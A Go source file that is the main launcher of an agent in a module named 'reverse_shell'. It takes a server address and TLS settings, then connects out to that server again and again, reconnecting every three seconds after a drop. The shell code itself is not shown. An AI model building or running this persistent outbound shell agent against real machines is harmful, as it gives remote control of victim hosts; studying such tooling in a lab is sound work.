package main

import (
	"flag"
	"os"
	"os/signal"
	"reverse_shell/agent"
	"syscall"
	"time"

	"go.uber.org/zap"
)

func main() {

	logger, _ := zap.NewProduction()
	defer logger.Sync()

	logger.Info(
		"Agent started",
		zap.String("version", "1.0.0"),
	)

	addr := flag.String("addr", "", "Server address (required)")
	caFile := flag.String("ca", "", "CA certificate file (required)")
	serverName := flag.String("server", "", "Server name for TLS verification (required)")
	flag.Parse()

	if *addr == "" {
		logger.Fatal("Error: -addr flag is required")
	}
	if *caFile == "" {
		logger.Fatal("Error: -ca flag is required")
	}
	if *serverName == "" {
		logger.Fatal("Error: -server flag is required")
	}

	_, exists := os.LookupEnv("AGENT_AUTH_FLAG")
	if !exists {
		logger.Warn("AGENT_AUTH_FLAG is not set")
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	for {
		select {
		case <-sigChan:
			logger.Info("Shutting down agent...")
			os.Exit(0)
		default:
			client, err := agent.Run(*addr, *caFile, *serverName, logger)
			if err != nil {
				logger.Error("Failed to start agent:", zap.Error(err))
				logger.Info("Retrying in 3 seconds...")
				time.Sleep(time.Second * 3)
				continue
			}

			<-client.Done

			logger.Info("Connection lost. Reconnecting in 3 seconds...")
			time.Sleep(time.Second * 3)
		}
	}
}
